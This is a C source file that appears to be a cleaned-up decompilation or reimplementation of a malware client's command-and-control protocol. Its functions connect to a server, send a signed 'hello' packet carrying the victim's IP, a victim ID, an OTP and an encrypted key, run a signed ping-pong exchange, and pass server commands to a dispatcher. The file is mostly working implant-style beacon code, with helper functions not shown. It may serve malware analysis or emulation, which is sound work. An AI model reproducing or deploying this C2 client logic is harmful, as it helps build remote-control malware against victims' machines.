#include <stdio.h>
#include "client.h"
#include "stubs.h"
#include "support.h"
#include "mock_data.h"


void client_init(const char *cp, __int16 a2, struct sockaddr *addr, struct bundle *bnd) {

    memset(bnd, 0, sizeof((*bnd)));

    bnd->state = STATE_INIT;

    make_srv_sock_addr(cp, a2, addr);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, addr, 0x10u);
    bnd->sock = sock;
}

void cleanBuffers(struct bundle *bnd) {
    bnd->rcvd = 0LL;
    bnd->sent = 0LL;
    memset(bnd->send_pkt_sign, 0, 0x300uLL);
    memset(bnd->rcv_buf, 0, sizeof(bnd->rcv_buf));
}

void rcv_hello_rsp(char *rcv_ptr, _QWORD rcv_len_2, int rcvd, struct bundle *bnd) {
    rcv_ptr = bnd->rcv_buf;
    bnd->sent = 656LL;
    bnd->rcvd = 0LL;
    memset(bnd->rcv_buf, 0, sizeof(bnd->rcv_buf));
    rcv_len_2 = 0LL;
    while (1) {
        rcvd = recv(bnd->sock, rcv_ptr, 768 - rcv_len_2, 0);
        rcv_ptr += rcvd;
        rcv_len_2 = bnd->rcvd + rcvd;
        bnd->rcvd = rcv_len_2;
        if (rcv_len_2 > 0x2FF) {
            bnd->rcvd = 64LL;
            if (v_hh(bnd->send_pkt_sign, bnd->sent, bnd->rcv_buf, 64LL)) puts("PKT VERIFY FAILED");
            bnd->state = STATE_SRV_PING;
            break;
        }
    }
}

__int64 start_client(char *cp, __int16 a2) {
    int sock;
    unsigned int rv;
    _QWORD s4_rcvd;
    char *rcv_alias;
    char *srv_command_buf;
    int rcv_len;
    char *rcv_ptr;
    _QWORD rcv_len_2;
    int rcvd;
    _QWORD ping_len_sent;
    int loc_sent;
    _QWORD ttl_rcvd;
    int rcvd_2;
    socklen_t local_addr_len;
    struct sockaddr addr;
    struct bundle bnd;
    _WORD loc_addr_ln_hx;
    int cid_len;
    __int16 zero_pad;
    char zero_pad2;
    __int64 victim_ip_hx;
    char zero_pad3;
    __int64 client_id_maybe_hx[8];
    char zero_pad4;
    __int64 sign[8];
    char zero_pad5;
    union CliPkt payLoad;
    _BYTE pkt_prep[STD_PACKET_SIZE];

    client_init(cp, a2, &addr, &bnd);

    do {
        memset(&payLoad, 0, sizeof(payLoad));
        victim_ip_hx = 0LL;
        zero_pad3 = 0;
        cid_len = 0;
        zero_pad = 0;
        zero_pad2 = 0;
        memset(&pkt_prep, 0, 0x300uLL);
        memset(client_id_maybe_hx, 0, sizeof(client_id_maybe_hx));
        zero_pad4 = 0;
        memset(sign, 0, sizeof(sign));
        loc_addr_ln_hx = 0;
        zero_pad5 = 0;

        switch (bnd.state) {
            case STATE_INIT:
                get_my_addr(&local_addr_len, &bnd);
                bnd.state = STATE_CLI_HELLO;
                continue;

            case STATE_CLI_HELLO:

                send_hello_pkt(
                        &loc_addr_ln_hx, &cid_len, &victim_ip_hx,
                        client_id_maybe_hx, sign, &local_addr_len, &bnd,
                        &payLoad, &pkt_prep);

                rcv_hello_rsp(rcv_ptr, rcv_len_2, rcvd, &bnd);

                goto STG_DONE;

            case STATE_SRV_PING:
                do_ping_pong(&loc_addr_ln_hx, client_id_maybe_hx, sign, &local_addr_len, &bnd, &payLoad);
                goto HANDLE_ERR;
            case STATE_CLI_PONG:
                bnd.state = STATE_CLEANUP;
                cleanBuffers(&bnd);
                rcv_alias = bnd.rcv_buf;
                break;
            case STATE_CLEANUP:
                bnd.done = 1;
                cleanBuffers(&bnd);
                goto LABEL_6;
            default:
                cleanBuffers(&bnd);
                goto LABEL_30;
        }

        srv_command_buf = rcv_alias;
        recv(bnd.sock, rcv_alias, 768, 0);
        bnd.rcvd = 768;
        if (dispatch_server_command(&bnd, srv_command_buf)) {
            HANDLE_ERR:
            bnd.state = STATE_CLEANUP;
            continue;
        }
        LABEL_30:
        STG_DONE:;
    } while (!bnd.done);

    LABEL_6:
    shutdown(bnd.sock, 2);
    rv = 0;
    return rv;
}

int do_ping_pong(_WORD *loc_addr_ln_hx, const __int64 *client_id_maybe_hx, const __int64 *sign, socklen_t *local_addr_len,
             struct bundle *bnd, union CliPkt *payLoad) {

    prep_ping_pkt(loc_addr_ln_hx, client_id_maybe_hx, sign, local_addr_len, bnd, payLoad);

    send(bnd->sock, bnd->send_pkt_sign, 768, 0);

    bnd->sent = 130LL;
    memset(bnd->rcv_buf, 0, sizeof(bnd->rcv_buf));
    recv(bnd->sock, bnd->rcv_buf, 768, 0);

    bnd->rcvd = 106LL;
    if (v_hh(&bnd->rcv_buf[64], 42LL, bnd->rcv_buf, 64LL)) {
        printf("Error verifying RCV buf..");
        return -1;
    }

    memset(sign, 0, sizeof(sign));
    if (c_hh(bnd->rcv_buf, bnd->rcvd, sign, 64LL)) {
        cleanBuffers(bnd);
        memcpy(bnd->send_pkt_sign, sign, sizeof(bnd->send_pkt_sign));

        if (!transmit(bnd)) {
            bnd->sent = 64LL;
            bnd->state = STATE_CLI_PONG;
            return 0;
        }
    }

    return -1;
}

void prep_ping_pkt(_WORD *loc_addr_ln_hx, const __int64 *victim_id_hx, const __int64 *sign,
                   socklen_t *local_addr_len, struct bundle *bnd, union CliPkt *payLoad) {


    LOBYTE((*local_addr_len)) = 3;
    memset(bnd->rcv_buf, 0, sizeof((*bnd).rcv_buf));
    memset(bnd->send_pkt_sign, 0, 0x300uLL);
    memset(payLoad, 0, sizeof((*payLoad)));

    bcvh(local_addr_len, 1LL, loc_addr_ln_hx, 3LL);
    bcvh(bnd->victim_id, 32LL, victim_id_hx, 65LL);

    payLoad->ping.local_addr = *loc_addr_ln_hx;
    memcpy(payLoad->ping.client_id_maybe, victim_id_hx, sizeof(payLoad->ping.client_id_maybe));

    c_hh(payLoad, 66LL, sign, 64LL);


    memcpy(bnd->send_pkt_sign, sign, sizeof(bnd->send_pkt_sign));
    memcpy(bnd->send_pkt_pload, payLoad, sizeof(payLoad->ping));

    bnd->rcvd = 0LL;
    bnd->sent = 0LL;
}

void send_hello_pkt(_WORD *loc_addr_ln_hx, char *otp, _QWORD *victim_ip_hx,
                    const __int64 *victim_id_hx, const __int64 *sign, socklen_t *pkt_type,
                    struct bundle *bnd, union CliPkt *payLoad, _BYTE *pkt_prep) {

    bnd->rcvd = 0LL;
    bnd->sent = 0LL;

    memset(bnd->rcv_buf, 0, sizeof(bnd->rcv_buf));
    memset(bnd->send_pkt_sign, 0, 768uLL);

    LOBYTE((*pkt_type)) = 2;

    enc_ki(pkt_prep, 512LL);
    bcvh(pkt_type, 1LL, loc_addr_ln_hx, 3LL);
    bcvh(&bnd->victim_ip, 4LL, victim_ip_hx, 9LL);
    cid(&bnd->victim_ip, bnd->victim_id, otp);
    bcvh(bnd->victim_id, 32LL, victim_id_hx, 65LL);

    payLoad->hello.local_addr = (*loc_addr_ln_hx);
    payLoad->hello.victim_ip_hx = (*victim_ip_hx);

    memcpy(payLoad->hello.otp, otp, 6);
    memcpy(payLoad->hello.client_id_maybe, victim_id_hx, sizeof(payLoad->hello.client_id_maybe));
    memcpy(payLoad->hello.enc_k, pkt_prep, sizeof(payLoad->hello.enc_k));

    c_hh(payLoad, 592LL, sign, 64LL);

    memcpy(bnd->send_pkt_sign, sign, sizeof(bnd->send_pkt_sign));
    memcpy(bnd->send_pkt_pload, payLoad, 0x250uLL);

    transmit(bnd);

}

void get_my_addr(socklen_t *local_addr_len, struct bundle *bnd) {
    (*local_addr_len) = 0x10;
    bzero(&bnd->loc_addr, sizeof(bnd->loc_addr));
    bnd->loc_addr.sin_family = AF_INET;
    getsockname(bnd->sock, (struct sockaddr *) &bnd->loc_addr, local_addr_len);
    bnd->victim_ip = bnd->loc_addr.sin_addr.s_addr;
}

void make_srv_sock_addr(const char *cp, __int16 a2, struct sockaddr *addr) {
    addr->sa_family = AF_INET;
    addr->sa_len = sizeof(struct sockaddr_in);
    struct sockaddr_in * sin = (struct sockaddr_in *) addr;
    sin->sin_port = htons(a2);
    sin->sin_addr.s_addr = inet_addr(cp);
}

